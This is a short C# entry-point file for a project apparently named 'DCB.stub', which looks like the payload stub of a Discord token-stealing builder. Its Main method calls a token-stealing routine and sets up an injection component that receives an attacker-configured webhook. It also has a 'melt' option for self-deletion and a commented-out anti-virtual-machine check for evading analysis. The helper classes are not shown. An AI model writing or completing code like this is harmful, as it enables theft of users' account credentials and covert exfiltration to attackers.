using DCB.stub.components;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
namespace DCB.stub
{
    internal class Program
    {
        static void RunInjection(string webhook)
        {
            new disinjection(webhook);
        }
        static void Main(string[] args)
        {
            //if (Settings.Antivm &&Detector.IsVirtualMachine()) Environment.FailFast(null);
            Thread injectionThread = new Thread(() => RunInjection(Settings.Webhook));
            tokenstealer.stealtokens();
            if (Settings.Melt) melt.meltfile();
        }
    }
}
